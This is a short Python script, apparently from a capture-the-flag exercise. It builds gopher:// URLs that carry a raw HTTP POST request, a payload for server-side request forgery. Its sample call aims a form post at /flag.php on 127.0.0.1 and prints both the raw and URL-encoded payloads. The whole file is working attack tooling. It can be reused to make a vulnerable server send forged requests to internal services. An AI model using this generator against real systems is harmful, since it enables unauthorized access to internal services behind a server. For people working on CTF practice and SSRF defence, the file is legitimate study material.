from urllib.parse import quote
import json


def construct_gopher_url(method, path, headers, data):
    payload = ""

    if headers.get("Content-Type") == "application/x-www-form-urlencoded":
        for key, value in data.items():
            payload += f"{quote(key)}={quote(value)}&"
    elif headers.get("Content-Type") == "application/json":
        payload = json.dumps(data)

    content_length = len(payload)  # Calculate the length of the payload

    headers_str = "\r\n".join([f"{key}: {value}" for key, value in headers.items()])

    domain_name = headers.get("Host", "")  # Get the domain name from the headers

    url = f"gopher://{domain_name}:80/_{method} {quote(path)} HTTP/1.1\r\n{headers_str}\r\nContent-Length: {content_length}\r\n\r\n{payload}"

    return url, url.replace("\r\n", "%0D%0A").replace(" ", "%20")


host = "127.0.0.1"

headers = {"Host": host, "Content-Type": "application/x-www-form-urlencoded"}
data = {"givemeflag": "yes"}

url, gopher_url = construct_gopher_url("POST", "/flag.php", headers, data)

print(url)
print(gopher_url)
